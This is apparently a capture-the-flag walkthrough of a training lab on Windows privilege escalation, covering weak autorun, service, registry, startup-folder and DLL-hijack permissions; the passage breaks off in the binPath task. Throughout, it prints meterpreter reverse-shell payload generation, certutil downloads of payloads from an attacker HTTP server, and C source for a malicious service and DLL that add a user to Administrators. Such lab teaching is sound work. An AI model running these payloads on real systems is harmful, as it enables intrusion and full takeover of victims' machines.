# Windows PrivEsc Arena

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Medium
Tags: Windows
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description:
Students will learn how to escalate privileges using a very vulnerable Windows 7 VM. RDP is open. 
Your credentials are user:password321
```

Room link: [https://tryhackme.com/room/windowsprivescarena](https://tryhackme.com/room/windowsprivescarena)

## Solution

### Task 1: Connecting to TryHackMe network

To complete this room and access the vulnerable Windows machine, you need to first connect to TryHackMe's VPN. If you've not done this before, first complete the [OpenVPN room](https://tryhackme.com/room/openvpn) and learn how to connect.

![OpenVPN Logo](Images/OpenVPN_Logo.png)

---------------------------------------------------------------------------------------

### Task 2: Deploy the Vulnerable machine

This room will teach you a variety of Windows privilege escalation tactics, including kernel exploits, DLL hijacking, service exploits, registry exploits, and more. This lab was built utilizing Sagi Shahar's privesc workshop ([https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)) and utilized as part of The Cyber Mentor's Windows Privilege Escalation Udemy course ([http://udemy.com/course/windows-privilege-escalation-for-beginners](http://udemy.com/course/windows-privilege-escalation-for-beginners)).

All tools needed to complete this course are on the **user** desktop (`C:\Users\user\Desktop\Tools`).

Let's first connect to the machine. RDP is open on port 3389. Your credentials are:

- username: `user`
- password: `password321`

For any administrative actions you might take, your credentials are:

- username: `TCM`
- password: `Hacker123`

---------------------------------------------------------------------------------------

#### Deploy the machine and log into the user account via RDP

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ export TARGET_IP=10.64.160.45                                                                          

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ xfreerdp /v:$TARGET_IP /cert:ignore /u:user /p:'password321' /h:1024 /w:1500 +clipboard /tls-seclevel:0
[15:23:38:591] [17150:17151] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[15:23:38:591] [17150:17151] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
<---snip--->
```

Note the required `/tls-seclevel:0` parameter!

#### Open a command prompt and run 'net user'. Who is the other non-default user on the machine?

```bat
C:\Users\user>net user

User accounts for \\TCM-PC

-------------------------------------------------------------------------------
Administrator            Guest                    TCM
user
The command completed successfully.


C:\Users\user>
```

Answer: `TCM`

---------------------------------------------------------------------------------------

### Task 3: Registry Escalation - Autorun

#### Detection

Windows VM

1. Open command prompt and type: `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe`
2. In Autoruns, click on the ‘Logon’ tab.
3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
4. In command prompt type: `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"`
5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.

#### Exploitation

Kali VM

1. Open command prompt and type: `msfconsole
2. In Metasploit (msf > prompt) type: `use multi/handler`
3. In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp`
4. In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
5. In Metasploit (msf > prompt) type: `run`
6. Open an additional command prompt and type: `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe`
7. Copy the generated file, program.exe, to the Windows VM.

Windows VM

1. Place program.exe in ‘C:\Program Files\Autorun Program’.
2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

Kali VM

1. Wait for a new session to open in Metasploit.
2. In Metasploit (msf > prompt) type: sessions -i [Session ID]
3. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid

---------------------------------------------------------------------------------------

#### Detect the vulnerability

Launch AutoRuns and check the `Logon` tab

![AutoRun Program Identified](Images/AutoRun_Program_Identified.png)

Check the permissions of the binary

```bat
C:\Users\user\Desktop\Tools\Accesschk>accesschk64.exe -wvu "C:\Program Files\Autorun Program"

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS

C:\Users\user\Desktop\Tools\Accesschk>
```

Note that Everyone has Read/Write (`RW`) access.

#### Create a reverse shell and share it via HTTP

Next, we create a meterpreter reverse shell with msfvenom

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.144.77 -f exe -o program.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: program.exe

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

#### Start a multi/handler listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ msfconsole -q                                                                                                                                    
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.144.77
LHOST => 192.168.144.77
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.144.77:4444 

```

#### Download the reverse shell to target machine

```bat
C:\Users\user\Desktop>certutil -urlcache -split -f http://192.168.144.77:8000/program.exe program.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

C:\Users\user\Desktop>
```

#### Overwrite the autostart binary

```bat
C:\Users\user\Desktop>copy /Y program.exe "C:\Program Files\Autorun Program\program.exe"
        1 file(s) copied.

C:\Users\user\Desktop>
```

#### Logout and login again

Then logout and login again **as TCM** to trigger the reverse shell!

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ xfreerdp /v:$TARGET_IP /cert:ignore /u:TCM /p:'Hacker123' /h:1024 /w:1500 +clipboard /tls-seclevel:0 /sec:rdp
[16:09:37:681] [40479:40480] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[16:09:37:681] [40479:40480] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
<---snip--->
```

Note the additional of the `/sec:rdp` parameter!

#### Check the listener for a connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ msfconsole -q                                                                                                                                    
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.144.77
LHOST => 192.168.144.77
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.144.77:4444 
[*] Started reverse TCP handler on 192.168.144.77:4444 
[*] Sending stage (177734 bytes) to 10.64.160.45
[*] Meterpreter session 2 opened (192.168.144.77:4444 -> 10.64.160.45:49293) at 2026-02-16 16:10:33 +0100

meterpreter > sysinfo
Computer        : TCM-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: TCM-PC\TCM
meterpreter > 
```

Finally, disable the program in Autoruns by clicking on the checkbox next to it.

---------------------------------------------------------------------------------------

### Task 4: Registry Escalation - AlwaysInstallElevated

#### Detection

Windows VM

1. Open command prompt and type: `reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
2. From the output, notice that “AlwaysInstallElevated” value is 1.
3. In command prompt type: `reg query HKCU\Software\Policies\Microsoft\Windows\Installer`
4. From the output, notice that “AlwaysInstallElevated” value is 1.

#### Exploitation

Kali VM

1. Open command prompt and type: `msfconsole`
2. In Metasploit (msf > prompt) type: `use multi/handler`
3. In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp`
4. In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
5. In Metasploit (msf > prompt) type: `run`
6. Open an additional command prompt and type: `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi`
7. Copy the generated file, setup.msi, to the Windows VM.

Windows VM

1.Place ‘setup.msi’ in ‘C:\Temp’.
2.Open command prompt and type: `msiexec /quiet /qn /i C:\Temp\setup.msi`

Enjoy your shell! :)

---------------------------------------------------------------------------------------

#### Detect the vulnerability

Check the registry values

```bat
C:\Users\user>reg query HKLM\Software\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\Users\user>reg query HKCU\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\Users\user>
```

#### Create a reverse shell in MSI-format and share it via HTTP

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.144.77 -f msi -o setup.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of msi file: 159744 bytes
Saved as: setup.msi

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ python -m http.server                                                               
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

#### Download the reverse shell to the target machine

```bat
C:\Users\user\Desktop>certutil -urlcache -split -f http://192.168.144.77:8000/setup.msi setup.msi
****  Online  ****
  000000  ...
  027000
CertUtil: -URLCache command completed successfully.

C:\Users\user\Desktop>
```

#### Create a listener in Metasploit

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ msfconsole -q                                                                                                                                    
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.144.77
LHOST => 192.168.144.77
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.144.77:4444 

```

#### Trigger the reverse shell

```bat
C:\Users\user\Desktop>msiexec /quiet /qn /i setup.msi

C:\Users\user\Desktop>
```

#### Check the listener for a connection

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.144.77:4444 
[*] Sending stage (177734 bytes) to 10.64.160.45
[*] Meterpreter session 3 opened (192.168.144.77:4444 -> 10.64.160.45:49330) at 2026-02-16 16:27:22 +0100

meterpreter > sysinfo
Computer        : TCM-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

---------------------------------------------------------------------------------------

### Task 5: Service Escalation - Registry

#### Detection

Windows VM

1. Open powershell prompt and type: `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`
2. Notice that the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.

#### Exploitation

Windows VM

1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ to the Kali VM.

Kali VM

1. Open windows_service.c in a text editor and replace the command used by the system() function to: `cmd.exe /k net localgroup administrators user /add`
2. Exit the text editor and compile the file by typing the following in the command prompt: `x86_64-w64-mingw32-gcc windows_service.c -o x.exe`  
(NOTE: if this is not installed, use `sudo apt install gcc-mingw-w64`)
3. Copy the generated file x.exe, to the Windows VM.

Windows VM

1. Place x.exe in ‘C:\Temp’.
2. Open command prompt at type: `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
3. In the command prompt type: `sc start regsvc`
4. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`

---------------------------------------------------------------------------------------

#### Detect the vulnerability

Check the registry permissions

```powershell
PS C:\Users\user> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)



PS C:\Users\user>
```

#### Compile the service binary

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ vi windows_service.c

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ cat windows_service.c
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

//add the payload here
int Run() 
{ 
    system("cmd.exe /k net localgroup administrators user /add");
    return 0; 
} 

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
 
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
    Run(); 
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
 
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
                Sleep(SLEEP_TIME);
    }
    return; 
}

void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
                        ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
    SetServiceStatus (hStatus,  &ServiceStatus);
    return; 
} 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ x86_64-w64-mingw32-gcc windows_service.c -o service.exe

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ file service.exe 
service.exe: PE32+ executable (console) x86-64, for MS Windows, 19 sections

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ 
```

#### Share the file via HTTP

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

#### Download the file to the target machine

```bat
C:\Users\user\Desktop>certutil -urlcache -split -f http://192.168.144.77:8000/service.exe service.exe
****  Online  ****
  000000  ...
  01c22b
CertUtil: -URLCache command completed successfully.

C:\Users\user\Desktop>
```

#### Update the registry with the new service and start it

```bat
C:\Users\user\Desktop>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\Users\us
er\Desktop\service.exe /f
The operation completed successfully.

C:\Users\user\Desktop> sc start regsvc

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1264
        FLAGS              :

C:\Users\user\Desktop>
```

#### Verify that we are administrator

```bat
C:\Users\user\Desktop>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.


C:\Users\user\Desktop>
```

Finally, remove the `user` from the Administrators group.

---------------------------------------------------------------------------------------

### Task 6: Service Escalation - Executable Files

#### Detection

Windows VM

1. Open command prompt and type: `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"`
2. Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.

#### Exploitation

Windows VM

1. Open command prompt and type: `copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"`
2. In command prompt type: `sc start filepermsvc`
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`

---------------------------------------------------------------------------------------

#### Detect the vulnerability

Check the file permissions of the service binary

```bat
C:\Users\user\Desktop\Tools\Accesschk>accesschk64.exe -wvu "C:\Program Files\File Permissions Service"

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS

C:\Users\user\Desktop\Tools\Accesschk>
```

Note that we have write permissions!

### Replace the service binary with our malicious service

```bat
C:\Users\user\Desktop>copy /Y service.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
        1 file(s) copied.

C:\Users\user\Desktop>
```

### Start the service and verify that we are admin

```bat
C:\Users\user\Desktop>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
The command completed successfully.


C:\Users\user\Desktop> sc start filepermsvc

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2432
        FLAGS              :

C:\Users\user\Desktop>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.


C:\Users\user\Desktop>
```

Finally, remove the `user` from the Administrators group.

---------------------------------------------------------------------------------------

### Task 7: Privilege Escalation - Startup Applications

#### Detection

Windows VM

1. Open command prompt and type: `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`
2. From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.

#### Exploitation

Kali VM

1. Open command prompt and type: `msfconsole`
2. In Metasploit (msf > prompt) type: `use multi/handler`
3. In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp`
4. In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
5. In Metasploit (msf > prompt) type: `run`
6. Open another command prompt and type: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe`
7. Copy the generated file, `x.exe`, to the Windows VM.

Windows VM

1. Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.
2. Logoff.
3. Login with the administrator account credentials.

Kali VM

1. Wait for a session to be created, it may take a few seconds.
2. In Meterpreter(meterpreter > prompt) type: `getuid`
3. From the output, notice the user is “User-PC\Admin”

---------------------------------------------------------------------------------------

#### Detect the vulnerability

Check the permissions of the Startup directory

```bat
C:\Users\user\Desktop>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
                                                             TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
                                                             Everyone:(I)(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files

C:\Users\user\Desktop>
```

Note that we have Full access (`(F)`)

#### Add the reverse shell to the startup folder

```bat
C:\Users\user\Desktop>copy program.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
        1 file(s) copied.

C:\Users\user\Desktop>
```

#### Logout and login again as admin

This will trigger the reverse shell

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.144.77:4444 
[*] Sending stage (177734 bytes) to 10.64.160.45
[*] Meterpreter session 4 opened (192.168.144.77:4444 -> 10.64.160.45:49426) at 2026-02-16 17:23:19 +0100

meterpreter > sysinfo
Computer        : TCM-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 6
Meterpreter     : x86/windows
meterpreter > getuid
Server username: TCM-PC\TCM
meterpreter > 
```

Finally, delete the reverse shell from the Startup folder.

---------------------------------------------------------------------------------------

### Task 8: Service Escalation - DLL Hijacking

#### Detection

Windows VM

1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.
3. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.
4. In the input box on the same line type: `dllhijackservice.exe`
5. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
6. Next, select from the left-most drop down menu ‘Result’.
7. In the input box on the same line type: NAME NOT FOUND
8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
9. Open command prompt and type: sc start dllsvc
10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.

Exploitation

Windows VM

1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_dll.c’ to the Kali VM.

Kali VM

1. Open windows_dll.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
3. Copy the generated file hijackme.dll, to the Windows VM.

Windows VM

1. Place hijackme.dll in ‘C:\Temp’.
2. Open command prompt and type: sc stop dllsvc & sc start dllsvc
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

---------------------------------------------------------------------------------------

#### Detect the vulnerability

Run Process Monitor as an Administrator and filter for:

- `dllhijackservice.exe` as Process Name
- `NAME NOT FOUND` as Result

and disable Registry and Network Events.

Then start the service

```bat
C:\Users\user\Desktop> sc start dllsvc

SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3032
        FLAGS              :

C:\Users\user\Desktop>
```

and check the result in Process Monitor

![Process Monitor DLL Hijacking](Images/Process_Monitor_DLL_Hijacking.png)

Note the failed attempt to load `C:\Temp\hijackme.dll`.

#### Compile a malicious DLL

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ vi windows_dll.c    

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ cat windows_dll.c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}


┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ file hijackme.dll 
hijackme.dll: PE32+ executable (DLL) (console) x86-64, for MS Windows, 20 sections

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ 
```

#### Share the DLL via HTTP

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

#### Download the DLL to the target machine

```bat
C:\Users\user\Desktop> certutil -urlcache -split -f http://192.168.144.77:8000/hijackme.dll C:\Temp\hijackme.dll
****  Online  ****
  000000  ...
  0150ae
CertUtil: -URLCache command completed successfully.

C:\Users\user\Desktop> dir C:\temp
 Volume in drive C has no label.
 Volume Serial Number is F8D5-CDBC

 Directory of C:\temp

02/16/2026  11:52 AM    <DIR>          .
02/16/2026  11:52 AM    <DIR>          ..
02/16/2026  11:52 AM            86,190 hijackme.dll
               1 File(s)         86,190 bytes
               2 Dir(s)  51,689,304,064 bytes free

C:\Users\user\Desktop>
```

#### Restart the service

```bat
C:\Users\user\Desktop>sc stop dllsvc & sc start dllsvc

SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 580
        FLAGS              :

C:\Users\user\Desktop>
```

#### Verify that we are Admin

```bat
C:\Users\user\Desktop> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.


C:\Users\user\Desktop>
```

#### Remove the user from the group

Finally, remove the user from the Administrators group.

```bat
C:\Windows\system32> net localgroup administrators user /del
The command completed successfully.


C:\Windows\system32> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
The command completed successfully.


C:\Windows\system32>
```

---------------------------------------------------------------------------------------

### Task 9: Service Escalation - binPath

#### Detection

Windows VM

1. Open command prompt and type: `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc`
2. Notice that the output suggests that the user “User-PC\User” has the “SERVICE_CHANGE_CONFIG” permission.

#### Exploitation

Windows VM

1. In command prompt type: `sc config daclsvc binpath= "net localgroup administrators user /add"`
2. In command prompt type: `sc start daclsvc`
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`

---------------------------------------------------------------------------------------

#### Detect the vulnerability

```bat
C:\Users\user\Desktop\Tools\Accesschk>accesschk64.exe -wuvc daclsvc

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
